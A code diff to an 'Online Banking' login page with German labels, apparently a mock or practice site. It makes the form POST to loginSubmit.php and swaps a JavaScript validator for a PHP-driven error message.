@@ -67,7 +67,7 @@
         <div id="sideswap" class="row">
           <div class="col-md-4">
             <div id="login-box" class="epic">
-              <form>
+              <form action="loginSubmit.php" method="POST">
                 <h4 class="ltitle">Online Banking</h4>
                 <select id="thiswontmatter">
                   <option>Privat</option>
@@ -77,11 +77,18 @@
                 <input id="username"  type="text" name="user" placeholder="username">
                 <input  id="password" style="margin-top:8px;" type="password" name="pass" placeholder="password">
                 <div id="loading">Bitte warten...</div>
+                <div class="spacer"></div>
+                <input type="submit" value="Einloggen">
               </form>
-              <div class="spacer"></div>
-              <input type="submit" value="Einloggen" onclick="validate()">
-              <p id="loginerror">Bitte überprüfen Sie Ihre Eingabe.</p>
-              <script type="text/javascript" src="js/loginvalidator.js"></script>
+              <p id="loginerror" 
+              <?php 
+              if (isset($_GET["error"]) && $_GET["error"] == "login"){
+                echo "";
+              }else{
+                echo "hidden";
+              }
+              ?>
+              >Bitte überprüfen Sie Ihre Eingabe.</p>
             </div>
           </div>
         	<div class="col-md-8 headline">
